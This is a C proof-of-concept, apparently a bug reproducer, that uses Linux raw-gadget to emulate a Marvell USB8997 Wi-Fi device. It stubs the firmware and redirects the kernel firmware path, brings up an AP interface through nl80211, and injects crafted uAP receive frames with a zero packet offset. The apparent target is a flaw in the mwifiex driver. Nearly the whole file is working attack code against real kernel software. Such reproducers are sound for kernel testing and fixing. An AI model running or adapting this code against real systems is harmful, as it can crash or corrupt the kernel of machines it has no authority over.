// gcc -O2 -static -o repro repro.c
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <linux/types.h>
#include <linux/netlink.h>

#define UDC_NAME_LENGTH_MAX 128

struct usb_raw_init {
	__u8 driver_name[UDC_NAME_LENGTH_MAX];
	__u8 device_name[UDC_NAME_LENGTH_MAX];
	__u8 speed;
};

enum usb_raw_event_type {
	USB_RAW_EVENT_INVALID = 0,
	USB_RAW_EVENT_CONNECT = 1,
	USB_RAW_EVENT_CONTROL = 2,
	USB_RAW_EVENT_SUSPEND = 3,
	USB_RAW_EVENT_RESUME = 4,
	USB_RAW_EVENT_RESET = 5,
	USB_RAW_EVENT_DISCONNECT = 6,
};

struct usb_raw_event {
	__u32 type;
	__u32 length;
	__u8 data[0];
};

struct usb_raw_ep_io {
	__u16 ep;
	__u16 flags;
	__u32 length;
	__u8 data[0];
};

#define USB_RAW_IOCTL_INIT       _IOW('U', 0, struct usb_raw_init)
#define USB_RAW_IOCTL_RUN        _IO('U', 1)
#define USB_RAW_IOCTL_EVENT_FETCH _IOR('U', 2, struct usb_raw_event)
#define USB_RAW_IOCTL_EP0_WRITE  _IOW('U', 3, struct usb_raw_ep_io)
#define USB_RAW_IOCTL_EP0_READ   _IOWR('U', 4, struct usb_raw_ep_io)
#define USB_RAW_IOCTL_EP_ENABLE  _IOW('U', 5, struct usb_endpoint_descriptor)
#define USB_RAW_IOCTL_EP_DISABLE _IOW('U', 6, __u32)
#define USB_RAW_IOCTL_EP_WRITE   _IOW('U', 7, struct usb_raw_ep_io)
#define USB_RAW_IOCTL_EP_READ    _IOWR('U', 8, struct usb_raw_ep_io)
#define USB_RAW_IOCTL_CONFIGURE  _IO('U', 9)
#define USB_RAW_IOCTL_VBUS_DRAW  _IOW('U', 10, __u32)
#define USB_RAW_IOCTL_EP0_STALL  _IO('U', 12)

struct usb_ctrlrequest {
	__u8 bRequestType;
	__u8 bRequest;
	__u16 wValue;
	__u16 wIndex;
	__u16 wLength;
} __attribute__((packed));

struct usb_endpoint_descriptor {
	__u8 bLength;
	__u8 bDescriptorType;
	__u8 bEndpointAddress;
	__u8 bmAttributes;
	__u16 wMaxPacketSize;
	__u8 bInterval;
	__u8 bRefresh;
	__u8 bSynchAddress;
} __attribute__((packed));

struct usb_device_descriptor {
	__u8 bLength;
	__u8 bDescriptorType;
	__u16 bcdUSB;
	__u8 bDeviceClass;
	__u8 bDeviceSubClass;
	__u8 bDeviceProtocol;
	__u8 bMaxPacketSize0;
	__u16 idVendor;
	__u16 idProduct;
	__u16 bcdDevice;
	__u8 iManufacturer;
	__u8 iProduct;
	__u8 iSerialNumber;
	__u8 bNumConfigurations;
} __attribute__((packed));

struct usb_config_descriptor {
	__u8 bLength;
	__u8 bDescriptorType;
	__u16 wTotalLength;
	__u8 bNumInterfaces;
	__u8 bConfigurationValue;
	__u8 iConfiguration;
	__u8 bmAttributes;
	__u8 bMaxPower;
} __attribute__((packed));

struct usb_interface_descriptor {
	__u8 bLength;
	__u8 bDescriptorType;
	__u8 bInterfaceNumber;
	__u8 bAlternateSetting;
	__u8 bNumEndpoints;
	__u8 bInterfaceClass;
	__u8 bInterfaceSubClass;
	__u8 bInterfaceProtocol;
	__u8 iInterface;
} __attribute__((packed));

#define USB_DT_DEVICE        0x01
#define USB_DT_CONFIG        0x02
#define USB_DT_STRING        0x03
#define USB_DT_INTERFACE     0x04
#define USB_DT_ENDPOINT      0x05
#define USB_DT_DEVICE_QUALIFIER 0x06
#define USB_DT_BOS           0x0f

#define USB_REQ_GET_DESCRIPTOR   0x06
#define USB_REQ_SET_CONFIGURATION 0x09
#define USB_REQ_SET_INTERFACE    0x0b
#define USB_REQ_GET_CONFIGURATION 0x08
#define USB_REQ_GET_INTERFACE    0x0a

#define USB_TYPE_MASK     (0x03 << 5)
#define USB_TYPE_STANDARD (0x00 << 5)
#define USB_DIR_IN        0x80

#define USB_SPEED_HIGH 3

#define USB8XXX_VID       0x1286
#define USB8997_PID_2     0x204e

#define MWIFIEX_USB_TYPE_CMD   0xF00DFACEu
#define MWIFIEX_USB_TYPE_DATA  0xBEADC0DEu
#define MWIFIEX_USB_TYPE_EVENT 0xBEEFFACEu

#define HostCmd_RET_BIT       0x8000
#define HostCmd_CMD_ID_MASK   0x0fff
#define HostCmd_CMD_GET_HW_SPEC 0x0003

#define EVENT_UAP_STA_ASSOC   0x0000002du
#define EVENT_UAP_BSS_ACTIVE  0x00000044u

#define MWIFIEX_BSS_TYPE_UAP  1
#define MWIFIEX_UAP_EVENT_EXTRA_HEADER 2

struct hcmd_gen {
	__u16 command;
	__u16 size;
	__u16 seq_num;
	__u16 result;
} __attribute__((packed));

struct hw_spec {
	__u16 hw_if_version;
	__u16 version;
	__u16 reserved;
	__u16 num_of_mcast_adr;
	__u8 permanent_addr[6];
	__u16 region_code;
	__u16 number_of_antenna;
	__u32 fw_release_number;
	__u32 reserved_1;
	__u32 reserved_2;
	__u32 reserved_3;
	__u32 fw_cap_info;
	__u32 dot_11n_dev_cap;
	__u8 dev_mcs_support;
	__u16 mp_end_port;
	__u16 mgmt_buf_count;
	__u32 reserved_5;
	__u32 reserved_6;
	__u32 dot_11ac_dev_cap;
	__u32 dot_11ac_mcs_support;
} __attribute__((packed));

static int raw_fd = -1;
static int ep1_in = -1, ep1_out = -1, ep2_in = -1, ep2_out = -1;
static volatile int eps_ready = 0;
static pthread_mutex_t ep1in_lock = PTHREAD_MUTEX_INITIALIZER;

static void logmsg(const char *fmt, ...)
{
	va_list ap;
	va_start(ap, fmt);
	fprintf(stderr, "[poc] ");
	vfprintf(stderr, fmt, ap);
	fprintf(stderr, "\n");
	va_end(ap);
	fflush(stderr);
}

static struct usb_device_descriptor dev_desc = {
	.bLength = 18,
	.bDescriptorType = USB_DT_DEVICE,
	.bcdUSB = 0x0200,
	.bDeviceClass = 0,
	.bDeviceSubClass = 0,
	.bDeviceProtocol = 0,
	.bMaxPacketSize0 = 64,
	.idVendor = USB8XXX_VID,
	.idProduct = USB8997_PID_2,
	.bcdDevice = 0x0001,
	.iManufacturer = 0,
	.iProduct = 0,
	.iSerialNumber = 0,
	.bNumConfigurations = 1,
};

#define NUM_EPS 4
#define CFG_TOTAL (9 + 9 + NUM_EPS * 7)

static struct usb_config_descriptor cfg_desc = {
	.bLength = 9,
	.bDescriptorType = USB_DT_CONFIG,
	.wTotalLength = CFG_TOTAL,
	.bNumInterfaces = 1,
	.bConfigurationValue = 1,
	.iConfiguration = 0,
	.bmAttributes = 0x80,
	.bMaxPower = 0x32,
};

static struct usb_interface_descriptor if_desc = {
	.bLength = 9,
	.bDescriptorType = USB_DT_INTERFACE,
	.bInterfaceNumber = 0,
	.bAlternateSetting = 0,
	.bNumEndpoints = NUM_EPS,
	.bInterfaceClass = 0xff,
	.bInterfaceSubClass = 0xff,
	.bInterfaceProtocol = 0xff,
	.iInterface = 0,
};

static struct usb_endpoint_descriptor eps[NUM_EPS] = {
	{ 7, USB_DT_ENDPOINT, 0x81, 0x02, 512, 0, 0, 0 },
	{ 7, USB_DT_ENDPOINT, 0x01, 0x02, 512, 0, 0, 0 },
	{ 7, USB_DT_ENDPOINT, 0x82, 0x02, 512, 0, 0, 0 },
	{ 7, USB_DT_ENDPOINT, 0x02, 0x02, 512, 0, 0, 0 },
};

static int raw_open(void)
{
	struct usb_raw_init arg;
	int fd = open("/dev/raw-gadget", O_RDWR);
	if (fd < 0) {
		logmsg("open /dev/raw-gadget: %s", strerror(errno));
		return -1;
	}
	memset(&arg, 0, sizeof(arg));
	strcpy((char *)arg.driver_name, "dummy_udc");
	strcpy((char *)arg.device_name, "dummy_udc.0");
	arg.speed = USB_SPEED_HIGH;
	if (ioctl(fd, USB_RAW_IOCTL_INIT, &arg) < 0) {
		logmsg("USB_RAW_IOCTL_INIT: %s", strerror(errno));
		close(fd);
		return -1;
	}
	if (ioctl(fd, USB_RAW_IOCTL_RUN, 0) < 0) {
		logmsg("USB_RAW_IOCTL_RUN: %s", strerror(errno));
		close(fd);
		return -1;
	}
	return fd;
}

static int ep0_write(const void *data, unsigned len)
{
	char buf[4096];
	struct usb_raw_ep_io *io = (struct usb_raw_ep_io *)buf;
	if (len > sizeof(buf) - sizeof(*io))
		len = sizeof(buf) - sizeof(*io);
	io->ep = 0;
	io->flags = 0;
	io->length = len;
	if (len && data)
		memcpy(&io->data[0], data, len);
	return ioctl(raw_fd, USB_RAW_IOCTL_EP0_WRITE, io);
}

static int ep0_read(void *data, unsigned len)
{
	char buf[4096];
	struct usb_raw_ep_io *io = (struct usb_raw_ep_io *)buf;
	int rv;
	io->ep = 0;
	io->flags = 0;
	io->length = len;
	rv = ioctl(raw_fd, USB_RAW_IOCTL_EP0_READ, io);
	if (rv > 0 && data)
		memcpy(data, &io->data[0], rv > (int)len ? len : (unsigned)rv);
	return rv;
}

static int ep_write(int ep, const void *data, unsigned len)
{
	char buf[8192];
	struct usb_raw_ep_io *io = (struct usb_raw_ep_io *)buf;
	if (len > sizeof(buf) - sizeof(*io))
		len = sizeof(buf) - sizeof(*io);
	io->ep = ep;
	io->flags = 0;
	io->length = len;
	memcpy(&io->data[0], data, len);
	return ioctl(raw_fd, USB_RAW_IOCTL_EP_WRITE, io);
}

static int ep_read(int ep, void *data, unsigned len)
{
	char buf[8192];
	struct usb_raw_ep_io *io = (struct usb_raw_ep_io *)buf;
	int rv;
	if (len > sizeof(buf) - sizeof(*io))
		len = sizeof(buf) - sizeof(*io);
	io->ep = ep;
	io->flags = 0;
	io->length = len;
	rv = ioctl(raw_fd, USB_RAW_IOCTL_EP_READ, io);
	if (rv > 0 && data)
		memcpy(data, &io->data[0], (unsigned)rv > len ? len : (unsigned)rv);
	return rv;
}

static void build_config(unsigned char *out)
{
	int i, off = 0;
	memcpy(out + off, &cfg_desc, 9); off += 9;
	memcpy(out + off, &if_desc, 9); off += 9;
	for (i = 0; i < NUM_EPS; i++) {
		memcpy(out + off, &eps[i], 7);
		off += 7;
	}
}

static int enable_eps(void)
{
	ep1_in = ioctl(raw_fd, USB_RAW_IOCTL_EP_ENABLE, &eps[0]);
	if (ep1_in < 0) logmsg("ep1_in enable: %s", strerror(errno));
	ep1_out = ioctl(raw_fd, USB_RAW_IOCTL_EP_ENABLE, &eps[1]);
	if (ep1_out < 0) logmsg("ep1_out enable: %s", strerror(errno));
	ep2_in = ioctl(raw_fd, USB_RAW_IOCTL_EP_ENABLE, &eps[2]);
	if (ep2_in < 0) logmsg("ep2_in enable: %s", strerror(errno));
	ep2_out = ioctl(raw_fd, USB_RAW_IOCTL_EP_ENABLE, &eps[3]);
	if (ep2_out < 0) logmsg("ep2_out enable: %s", strerror(errno));
	logmsg("ep handles: 1in=%d 1out=%d 2in=%d 2out=%d",
	       ep1_in, ep1_out, ep2_in, ep2_out);
	if (ep1_in < 0 || ep1_out < 0 || ep2_in < 0 || ep2_out < 0)
		return -1;
	return 0;
}

static void *ep0_thread(void *unused)
{
	char ebuf[sizeof(struct usb_raw_event) + sizeof(struct usb_ctrlrequest)];
	struct usb_raw_event *ev = (struct usb_raw_event *)ebuf;
	unsigned char cfgbuf[CFG_TOTAL];
	unsigned char rsp[512];

	(void)unused;
	build_config(cfgbuf);

	for (;;) {
		struct usb_ctrlrequest *ctrl;
		int rlen = -1;

		ev->type = 0;
		ev->length = sizeof(struct usb_ctrlrequest);
		if (ioctl(raw_fd, USB_RAW_IOCTL_EVENT_FETCH, ev) < 0) {
			logmsg("EVENT_FETCH: %s", strerror(errno));
			return NULL;
		}
		if (ev->type != USB_RAW_EVENT_CONTROL)
			continue;

		ctrl = (struct usb_ctrlrequest *)&ev->data[0];

		if ((ctrl->bRequestType & USB_TYPE_MASK) == USB_TYPE_STANDARD) {
			switch (ctrl->bRequest) {
			case USB_REQ_GET_DESCRIPTOR:
				switch (ctrl->wValue >> 8) {
				case USB_DT_DEVICE:
					memcpy(rsp, &dev_desc, 18);
					rlen = 18;
					break;
				case USB_DT_CONFIG:
					memcpy(rsp, cfgbuf, CFG_TOTAL);
					rlen = CFG_TOTAL;
					break;
				case USB_DT_STRING:

					rsp[0] = 4;
					rsp[1] = USB_DT_STRING;
					rsp[2] = 0x09;
					rsp[3] = 0x04;
					rlen = 4;
					break;
				default:
					rlen = -1;
					break;
				}
				break;
			case USB_REQ_SET_CONFIGURATION:
				if (!eps_ready) {
					if (enable_eps() == 0) {
						if (ioctl(raw_fd, USB_RAW_IOCTL_CONFIGURE, 0) < 0)
							logmsg("CONFIGURE: %s", strerror(errno));
						__sync_synchronize();
						eps_ready = 1;
					}
				}
				rlen = 0;
				break;
			case USB_REQ_SET_INTERFACE:
				rlen = 0;
				break;
			case USB_REQ_GET_CONFIGURATION:
				rsp[0] = 1;
				rlen = 1;
				break;
			case USB_REQ_GET_INTERFACE:
				rsp[0] = 0;
				rlen = 1;
				break;
			default:
				rlen = 0;
				break;
			}
		}

		if (rlen < 0) {
			ioctl(raw_fd, USB_RAW_IOCTL_EP0_STALL, 0);
			continue;
		}

		if ((ctrl->bRequestType & USB_DIR_IN) && ctrl->wLength) {
			if (rlen > ctrl->wLength)
				rlen = ctrl->wLength;
			if (ep0_write(rsp, rlen) < 0)
				logmsg("ep0_write(req %#x): %s",
				       ctrl->bRequest, strerror(errno));
		} else {
			if (ep0_read(rsp, ctrl->wLength > sizeof(rsp) ?
					  sizeof(rsp) : ctrl->wLength) < 0)
				logmsg("ep0_read(req %#x): %s",
				       ctrl->bRequest, strerror(errno));
		}
	}
	return NULL;
}

static unsigned long cmds_seen = 0;

static void fill_hw_spec(unsigned char *payload, unsigned *size)
{
	struct hw_spec *hs = (struct hw_spec *)payload;

	memset(hs, 0, sizeof(*hs));
	hs->hw_if_version = 0x0001;
	hs->version = 0x000f;
	hs->num_of_mcast_adr = 16;
	hs->permanent_addr[0] = 0x02;
	hs->permanent_addr[1] = 0x11;
	hs->permanent_addr[2] = 0x22;
	hs->permanent_addr[3] = 0x33;
	hs->permanent_addr[4] = 0x44;
	hs->permanent_addr[5] = 0x55;
	hs->region_code = 0x10;
	hs->number_of_antenna = 1;
	hs->fw_release_number = 0x000f0000;
	hs->fw_cap_info = 0;
	hs->dot_11n_dev_cap = 0;
	hs->dev_mcs_support = 0x11;
	hs->mp_end_port = 0;
	hs->mgmt_buf_count = 16;
	hs->dot_11ac_dev_cap = 0;
	hs->dot_11ac_mcs_support = 0;
	*size = sizeof(*hs);
}

static void *cmd_thread(void *unused)
{
	unsigned char rbuf[4096];
	unsigned char wbuf[4096];

	(void)unused;
	while (!eps_ready)
		usleep(1000);

	for (;;) {
		int n = ep_read(ep1_out, rbuf, 2048);
		unsigned int type;
		struct hcmd_gen *req, *rsp;
		unsigned int rsp_size;

		if (n < 0) {
			if (errno == EINTR || errno == EBUSY || errno == ESHUTDOWN) {
				usleep(1000);
				continue;
			}
			logmsg("ep1_out read: %s", strerror(errno));
			usleep(10000);
			continue;
		}
		if (n < (int)(4 + sizeof(struct hcmd_gen)))
			continue;

		memcpy(&type, rbuf, 4);
		if (type != MWIFIEX_USB_TYPE_CMD)
			continue;

		req = (struct hcmd_gen *)(rbuf + 4);
		cmds_seen++;

		rsp_size = req->size;
		if (rsp_size < sizeof(struct hcmd_gen) ||
		    rsp_size > (unsigned)(n - 4))
			rsp_size = (unsigned)(n - 4);
		if (rsp_size > sizeof(wbuf) - 4)
			rsp_size = sizeof(wbuf) - 4;

		memcpy(wbuf + 4, rbuf + 4, rsp_size);
		rsp = (struct hcmd_gen *)(wbuf + 4);
		rsp->command = (req->command & HostCmd_CMD_ID_MASK) | HostCmd_RET_BIT;
		rsp->result = 0;
		rsp->seq_num = req->seq_num;

		if ((req->command & HostCmd_CMD_ID_MASK) == HostCmd_CMD_GET_HW_SPEC) {
			unsigned psz = 0;
			fill_hw_spec(wbuf + 4 + sizeof(struct hcmd_gen), &psz);
			rsp_size = sizeof(struct hcmd_gen) + psz;
		}
		rsp->size = rsp_size;

		type = MWIFIEX_USB_TYPE_CMD;
		memcpy(wbuf, &type, 4);

		pthread_mutex_lock(&ep1in_lock);
		if (ep_write(ep1_in, wbuf, 4 + rsp_size) < 0)
			logmsg("cmd resp write (cmd %#x): %s",
			       req->command, strerror(errno));
		pthread_mutex_unlock(&ep1in_lock);
	}
	return NULL;
}

static void *data_out_thread(void *unused)
{
	unsigned char buf[4096];
	(void)unused;
	while (!eps_ready)
		usleep(1000);
	for (;;) {
		if (ep_read(ep2_out, buf, 4096) < 0)
			usleep(2000);
	}
	return NULL;
}

static int send_event(unsigned int cause, const unsigned char *body, unsigned blen)
{
	unsigned char buf[512];
	unsigned int type = MWIFIEX_USB_TYPE_EVENT;
	int rv;

	memset(buf, 0, sizeof(buf));
	memcpy(buf, &type, 4);
	memcpy(buf + 4, &cause, 4);
	if (body && blen) {
		if (blen > sizeof(buf) - 8)
			blen = sizeof(buf) - 8;
		memcpy(buf + 8, body, blen);
	} else {
		blen = 8;
	}

	pthread_mutex_lock(&ep1in_lock);
	rv = ep_write(ep1_in, buf, 4 + 4 + blen);
	pthread_mutex_unlock(&ep1in_lock);
	return rv;
}

static void add_station(int bss_num, const unsigned char mac[6])
{
	unsigned char body[32];

	memset(body, 0, sizeof(body));
	memcpy(body + MWIFIEX_UAP_EVENT_EXTRA_HEADER, mac, 6);

	body[8] = 0x00;
	body[9] = 0x00;

	logmsg("sending EVENT_UAP_STA_ASSOC for %02x:%02x:%02x:%02x:%02x:%02x",
	       mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
	send_event(EVENT_UAP_STA_ASSOC | ((unsigned)bss_num << 16) |
		   ((unsigned)MWIFIEX_BSS_TYPE_UAP << 24), body, sizeof(body));
}

#define GENL_ID_CTRL          16
#define CTRL_CMD_GETFAMILY    3
#define CTRL_ATTR_FAMILY_ID   1
#define CTRL_ATTR_FAMILY_NAME 2

#define NL80211_CMD_NEW_INTERFACE 7
#define NL80211_ATTR_WIPHY   1
#define NL80211_ATTR_IFNAME  4
#define NL80211_ATTR_IFTYPE  5
#define NL80211_IFTYPE_AP    3

struct genlmsghdr_ {
	__u8 cmd;
	__u8 version;
	__u16 reserved;
};

static int nl_put(char *buf, int off, int type, const void *d, int len)
{
	struct nlattr *a = (struct nlattr *)(buf + off);
	a->nla_type = type;
	a->nla_len = NLA_HDRLEN + len;
	memcpy(buf + off + NLA_HDRLEN, d, len);
	return off + NLMSG_ALIGN(a->nla_len);
}

static int nl_send_recv(int fd, char *buf, int len, char *rbuf, int rlen)
{
	struct sockaddr_nl sa;
	int n;

	memset(&sa, 0, sizeof(sa));
	sa.nl_family = AF_NETLINK;
	if (sendto(fd, buf, len, 0, (struct sockaddr *)&sa, sizeof(sa)) < 0)
		return -1;
	n = recv(fd, rbuf, rlen, 0);
	return n;
}

static int nl80211_family_id(int fd)
{
	char buf[512], rbuf[4096];
	struct nlmsghdr *nh = (struct nlmsghdr *)buf;
	struct genlmsghdr_ *gh = (struct genlmsghdr_ *)(buf + NLMSG_HDRLEN);
	int off, n;
	struct nlattr *a;
	int rem;

	memset(buf, 0, sizeof(buf));
	nh->nlmsg_type = GENL_ID_CTRL;
	nh->nlmsg_flags = NLM_F_REQUEST;
	nh->nlmsg_seq = 1;
	gh->cmd = CTRL_CMD_GETFAMILY;
	gh->version = 1;
	off = NLMSG_HDRLEN + 4;
	off = nl_put(buf, off, CTRL_ATTR_FAMILY_NAME, "nl80211", 8);
	nh->nlmsg_len = off;

	n = nl_send_recv(fd, buf, off, rbuf, sizeof(rbuf));
	if (n < 0)
		return -1;
	nh = (struct nlmsghdr *)rbuf;
	if (nh->nlmsg_type == NLMSG_ERROR)
		return -1;

	a = (struct nlattr *)(rbuf + NLMSG_HDRLEN + 4);
	rem = nh->nlmsg_len - NLMSG_HDRLEN - 4;
	while (rem >= (int)NLA_HDRLEN && rem >= a->nla_len) {
		if (a->nla_type == CTRL_ATTR_FAMILY_ID)
			return *(__u16 *)((char *)a + NLA_HDRLEN);
		rem -= NLMSG_ALIGN(a->nla_len);
		a = (struct nlattr *)((char *)a + NLMSG_ALIGN(a->nla_len));
	}
	return -1;
}

static int read_int_file(const char *path, int *out)
{
	char b[64];
	int fd = open(path, O_RDONLY);
	int n;
	if (fd < 0)
		return -1;
	n = read(fd, b, sizeof(b) - 1);
	close(fd);
	if (n <= 0)
		return -1;
	b[n] = 0;
	*out = atoi(b);
	return 0;
}

static int find_mwifiex_phy(void);

static int create_ap_iface(void)
{
	int fd, fam, wiphy_idx, off, n;
	char buf[1024], rbuf[4096];
	struct nlmsghdr *nh = (struct nlmsghdr *)buf;
	struct genlmsghdr_ *gh = (struct genlmsghdr_ *)(buf + NLMSG_HDRLEN);
	__u32 v32;

	wiphy_idx = find_mwifiex_phy();
	if (wiphy_idx < 0) {
		logmsg("no mwifiex wiphy found");
		return -1;
	}

	fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
	if (fd < 0) {
		logmsg("netlink socket: %s", strerror(errno));
		return -1;
	}
	fam = nl80211_family_id(fd);
	if (fam < 0) {
		logmsg("nl80211 family lookup failed");
		close(fd);
		return -1;
	}
	logmsg("nl80211 family id %d", fam);

	memset(buf, 0, sizeof(buf));
	nh->nlmsg_type = fam;
	nh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
	nh->nlmsg_seq = 2;
	gh->cmd = NL80211_CMD_NEW_INTERFACE;
	gh->version = 0;
	off = NLMSG_HDRLEN + 4;
	v32 = wiphy_idx;
	off = nl_put(buf, off, NL80211_ATTR_WIPHY, &v32, 4);
	off = nl_put(buf, off, NL80211_ATTR_IFNAME, "uapx0", 6);
	v32 = NL80211_IFTYPE_AP;
	off = nl_put(buf, off, NL80211_ATTR_IFTYPE, &v32, 4);
	nh->nlmsg_len = off;

	n = nl_send_recv(fd, buf, off, rbuf, sizeof(rbuf));
	if (n < 0) {
		logmsg("nl80211 NEW_INTERFACE send/recv: %s", strerror(errno));
		close(fd);
		return -1;
	}
	nh = (struct nlmsghdr *)rbuf;
	if (nh->nlmsg_type == NLMSG_ERROR) {
		struct nlmsgerr *e = (struct nlmsgerr *)((char *)nh + NLMSG_HDRLEN);
		if (e->error) {
			logmsg("NEW_INTERFACE failed: %s", strerror(-e->error));
			close(fd);
			return -1;
		}
	}
	logmsg("AP interface created");
	close(fd);
	return 0;
}

static int read_str_file(const char *path, char *out, int len)
{
	int fd = open(path, O_RDONLY);
	int n;
	if (fd < 0)
		return -1;
	n = read(fd, out, len - 1);
	close(fd);
	if (n <= 0)
		return -1;
	while (n > 0 && (out[n - 1] == '\n' || out[n - 1] == '\r'))
		n--;
	out[n] = 0;
	return 0;
}

static int find_mwifiex_phy(void)
{
	int i, idx;
	for (i = 0; i < 16; i++) {
		char p[192], vid[32], pid[32];
		snprintf(p, sizeof(p), "/sys/class/ieee80211/phy%d/index", i);
		if (read_int_file(p, &idx) != 0)
			continue;
		snprintf(p, sizeof(p), "/sys/class/ieee80211/phy%d/device/idVendor", i);
		if (read_str_file(p, vid, sizeof(vid)) != 0)
			continue;
		snprintf(p, sizeof(p), "/sys/class/ieee80211/phy%d/device/idProduct", i);
		if (read_str_file(p, pid, sizeof(pid)) != 0)
			continue;
		if (!strcmp(vid, "1286") && !strcmp(pid, "204e")) {
			logmsg("mwifiex phy%d -> wiphy index %d", i, idx);
			return idx;
		}
	}
	return -1;
}

static void dump_phys(void)
{
	int i, idx;
	for (i = 0; i < 16; i++) {
		char p[192], vid[32];
		snprintf(p, sizeof(p), "/sys/class/ieee80211/phy%d/index", i);
		if (read_int_file(p, &idx) != 0)
			continue;
		vid[0] = 0;
		snprintf(p, sizeof(p), "/sys/class/ieee80211/phy%d/device/idVendor", i);
		read_str_file(p, vid, sizeof(vid));
		logmsg("  phy%d idx=%d vendor='%s'", i, idx, vid);
	}
}

static int wait_for_phy(int secs)
{
	int i;
	for (i = 0; i < secs * 10; i++) {
		if (find_mwifiex_phy() >= 0)
			return 0;
		usleep(100000);
	}
	return -1;
}

static void setup_firmware_stub(void)
{
	int fd;
	unsigned char blob[4096];

	mkdir("./fw", 0755);
	mkdir("./fw/mrvl", 0755);
	memset(blob, 0x41, sizeof(blob));
	fd = open("./fw/mrvl/usbusb8997_combo_v4.bin",
		  O_WRONLY | O_CREAT | O_TRUNC, 0644);
	if (fd >= 0) {
		write(fd, blob, sizeof(blob));
		close(fd);
	} else {
		logmsg("cannot create firmware stub: %s", strerror(errno));
	}

	fd = open("/sys/module/firmware_class/parameters/path", O_WRONLY);
	if (fd >= 0) {
		write(fd, "./fw", 7);
		close(fd);
	} else {
		logmsg("cannot set firmware path: %s", strerror(errno));
	}
}

static void loud_printk(void)
{
	int fd = open("/proc/sys/kernel/printk", O_WRONLY);
	if (fd >= 0) {
		write(fd, "8 4 1 7\n", 8);
		close(fd);
	}
}

static void inject_rx_frame(int bss_num)
{
	unsigned char f[64];

	memset(f, 0, sizeof(f));

	f[0] = MWIFIEX_BSS_TYPE_UAP;
	f[1] = (unsigned char)bss_num;
	f[2] = 22;
	f[3] = 0;
	f[4] = 0;
	f[5] = 0;
	f[6] = 0x00;
	f[7] = 0x00;
	f[8] = 0xde;
	f[9] = 0xad;
	f[10] = 0;
	f[11] = 0xbe;
	f[12] = 0;
	f[13] = 0;

	f[14] = 0x00;
	f[15] = 0x00;
	f[16] = 0x00;

	logmsg("injecting crafted uAP RX frame (bss_type=1 bss_num=%d, "
	       "rx_pkt_offset=0, multicast h_dest)", bss_num);
	if (ep_write(ep2_in, f, sizeof(f)) < 0)
		logmsg("ep2_in write: %s", strerror(errno));
}

int main(void)
{
	pthread_t t0, t1, t2;
	int i;

	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);

	loud_printk();
	setup_firmware_stub();

	raw_fd = raw_open();
	if (raw_fd < 0)
		return 1;

	pthread_create(&t0, NULL, ep0_thread, NULL);
	pthread_create(&t1, NULL, cmd_thread, NULL);
	pthread_create(&t2, NULL, data_out_thread, NULL);

	for (i = 0; i < 100 && !eps_ready; i++)
		usleep(100000);
	logmsg("eps_ready=%d", eps_ready);

	if (wait_for_phy(40) < 0) {
		logmsg("mwifiex never registered a wiphy (cmds seen: %lu)",
		       cmds_seen);
		dump_phys();
		return 1;
	}
	logmsg("wiphy up after %lu commands", cmds_seen);
	sleep(1);

	if (create_ap_iface() < 0) {
		logmsg("failed to create AP interface (cmds seen: %lu)",
		       cmds_seen);
		return 1;
	}
	sleep(1);

	logmsg("sending EVENT_UAP_BSS_ACTIVE");
	send_event(EVENT_UAP_BSS_ACTIVE | (0u << 16) | ((unsigned)MWIFIEX_BSS_TYPE_UAP << 24),
		   NULL, 0);
	usleep(300000);

	{
		static const unsigned char sta[6] = { 0x00, 0x00, 0xde, 0xad, 0x00, 0xbe };
		add_station(0, sta);
		usleep(300000);
	}

	for (i = 0; i < 4; i++) {
		inject_rx_frame(0);
		usleep(200000);
	}

	sleep(5);
	logmsg("done (cmds seen: %lu)", cmds_seen);
	return 0;
}
